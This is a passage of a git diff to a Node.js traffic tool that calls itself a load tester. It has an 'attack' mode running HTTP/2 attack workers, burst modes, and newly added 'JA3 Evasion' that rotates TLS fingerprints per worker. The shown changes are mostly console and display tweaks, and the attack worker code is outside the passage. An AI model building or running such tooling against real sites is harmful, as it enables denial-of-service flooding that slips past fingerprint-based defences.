                 activeProtocols.forEach(p => {
-                    const title = `Protocol: ${p.toUpperCase()}`;
+                    const title = `${p.toUpperCase()}`;
                     const styledTitle = chalk.white.bold.underline(title);
                     const visibleLength = stripAnsi(styledTitle).length;
                     header += styledTitle + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
@@ -544,8 +725,8 @@ function updateMonitor() {
                         const count = pStats.statuses[code];
                         let cellText = '';
                         if (count) {
-                            const color = String(code).startsWith('2') ? chalk.green : String(code).startsWith('3') ? chalk.yellow : code === 'RESET' ? chalk.green : chalk.red;
-                            cellText = `  ${color(code)} (${HTTP_STATUS_CODES[code] || 'Unknown'}): ${chalk.blue(count)}`;
+                            const color = String(code).startsWith('2') ? chalk.green : String(code).startsWith('3') ? chalk.yellow : chalk.red;
+                            cellText = `${color(code)}: ${chalk.blue(count)}`;
                         }
                         const visibleLength = stripAnsi(cellText).length;
                         row += cellText + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
@@ -558,60 +739,63 @@ function updateMonitor() {
     
     console.log('');
     const logsToShow = attackMode !== 'none' ? lastAttackLogs : lastLogs;
-    const logTitle = attackMode !== 'none' ? 'Attack Log' : 'Request Log';
-
-    console.log(chalk.white.bold(`${logTitle} (last 5 events):`));
+    console.log(chalk.white.bold('Event Log (last 5):'));
     if (logsToShow.length === 0) console.log(chalk.gray('  (waiting...)'));
     else logsToShow.forEach(log => console.log(`  ${log}`));
 
-    console.log(chalk.cyan('--------------------------------------------'));
+    console.log(chalk.cyan('════════════════════════════════════════════════════════════════'));
 }
 
-// Graceful shutdown handler
+// Graceful shutdown
 async function gracefulShutdown() {
-    console.log(chalk.yellow('\nInitiating graceful shutdown...'));
+    console.log(chalk.yellow('\n🛑 Initiating graceful shutdown...'));
     isRunning = false;
     
-    // Close all active connections
     for (const conn of activeConnections) {
         try {
             if (conn.destroy) conn.destroy();
         } catch (e) {
-            // Ignore cleanup errors
+            // Ignore
         }
     }
     activeConnections.clear();
 }
 
-// --- Main Execution ---
+// Main execution
 async function main() {
-    console.log(chalk.green('Starting load test...'));
-    console.log(chalk.yellow(`Target: ${argv.url} | Duration: ${argv.time} min | Concurrency: ${argv.conc} | Attack: ${attackMode}`));
+    console.log(chalk.green('🚀 Starting enhanced load test...'));
+    console.log(chalk.yellow(`📍 Target: ${argv.url}`));
+    console.log(chalk.yellow(`⏱️  Duration: ${argv.time} min | 🔄 Concurrency: ${argv.conc}`));
+    console.log(chalk.yellow(`💥 Attack: ${attackMode} | 📊 Burst Mode: ${burstMode.name}`));
+    console.log(chalk.yellow(`🔐 JA3 Evasion: ${argv.enableJa3 ? 'ON' : 'OFF'} | 🔁 Retry: ${argv.enableRetry ? 'ON' : 'OFF'}`));
+    console.log('');
 
     if (attackMode !== 'none') {
         activeProtocols = ['h2'];
         stats.protocolStats['h2'] = { responses: 0, statuses: {} };
     } else if (argv.protocol) {
-        console.log(chalk.cyan(`Forcing specified protocols: ${argv.protocol}`));
+        console.log(chalk.cyan(`Forcing protocols: ${argv.protocol}`));
         const protocolMap = { '1.1': 'h1', '2': 'h2', '3': 'h3' };
         activeProtocols = argv.protocol.split(',').map(p => protocolMap[p.trim()]).filter(Boolean);
         if (activeProtocols.length === 0) {
-            throw new Error('Invalid protocol(s) specified. Use "1.1", "2", or "3".');
+            throw new Error('Invalid protocol(s) specified');
         }
     } else {
-        console.log(chalk.cyan('Auto-detecting supported protocols...'));
+        console.log(chalk.cyan('🔍 Auto-detecting protocols...'));
         let detected = new Set();
         await new Promise(resolve => {
             const timeout = setTimeout(() => {
-                console.log(chalk.yellow('Protocol detection timeout, defaulting to HTTP/1.1'));
+                console.log(chalk.yellow('Detection timeout, using HTTP/1.1'));
                 if (!detected.has('h1')) detected.add('h1');
                 resolve();
             }, CONFIG.PROTOCOL_DETECTION_TIMEOUT);
 
+            const ja3Profile = argv.enableJa3 ? getJa3Profile(0) : JA3_PROFILES[0];
+            const tlsOptions = createTlsOptions(ja3Profile);
+
             const req = https.request({
                 method: 'HEAD', host: target.host, port: target.port, path: '/',
-                rejectUnauthorized: false, ALPNProtocols: ['h2', 'http/1.1'], 
-                ...getRandomTlsProfile()
+                ...tlsOptions
             }, res => {
                 clearTimeout(timeout);
                 const altSvc = res.headers['alt-svc'];
@@ -636,15 +820,11 @@ async function main() {
         activeProtocols = Array.from(detected);
         if (activeProtocols.length === 0) activeProtocols.push('h1');
     }
-    console.log(chalk.green(`Protocols to be used: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}`));
+    console.log(chalk.green(`✓ Using protocols: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}\n`));
 
-    // Initialize protocol stats for all protocols
     activeProtocols.forEach(p => {
         stats.protocolStats[p] = { responses: 0, statuses: {} };
     });
-
-    // Cache TLS profile for consistency during worker phase
-    selectedTlsProfile = getRandomTlsProfile();
 
     const workerCounts = {};
     if (attackMode === 'none' && activeProtocols.length > 0) {
@@ -666,12 +846,15 @@ async function main() {
                 startHttp2AttackWorker();
             } else {
                 let client;
+                const ja3Profile = argv.enableJa3 ? getJa3Profile(workerId) : JA3_PROFILES[0];
+                const tlsOptions = createTlsOptions(ja3Profile);
+                
                 if (protocolKey === 'h3') {
-                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...selectedTlsProfile } });
+                    client = new Client(targetUrl, { connect: { ...tlsOptions } });
                 } else if (protocolKey === 'h2') {
-                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...selectedTlsProfile } });
-                } else { // h1
-                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...selectedTlsProfile }, pipelining: 1 });
+                    client = new Client(targetUrl, { connect: { ...tlsOptions } });
+                } else {
+                    client = new Client(targetUrl, { connect: { ...tlsOptions }, pipelining: 1 });
                 }
                 runStandardWorker(workerId++, client, protocolKey);
             }
@@ -685,7 +868,7 @@ async function main() {
         clearInterval(monitorInterval);
         await gracefulShutdown();
         updateMonitor();
-        console.log(chalk.green.bold('\nTest finished!'));
+        console.log(chalk.green.bold('\n✓ Test finished!\n'));
         process.exit(0);
     }, durationMs);
 
@@ -695,7 +878,7 @@ async function main() {
         clearTimeout(testTimeout);
         await gracefulShutdown();
         updateMonitor();
-        console.log(chalk.red.bold('\nTest interrupted by user.'));
+        console.log(chalk.red.bold('\n✗ Test interrupted by user.\n'));
         process.exit(1);
     });
 
@@ -705,12 +888,12 @@ async function main() {
         clearTimeout(testTimeout);
         await gracefulShutdown();
         updateMonitor();
-        console.log(chalk.red.bold('\nTest terminated.'));
+        console.log(chalk.red.bold('\n✗ Test terminated.\n'));
         process.exit(0);
     });
 }
 
 main().catch(err => {
-    console.error(chalk.red('A critical error occurred:'), err.message);
+    console.error(chalk.red('❌ Critical error:'), err.message);
     process.exit(1);
 });
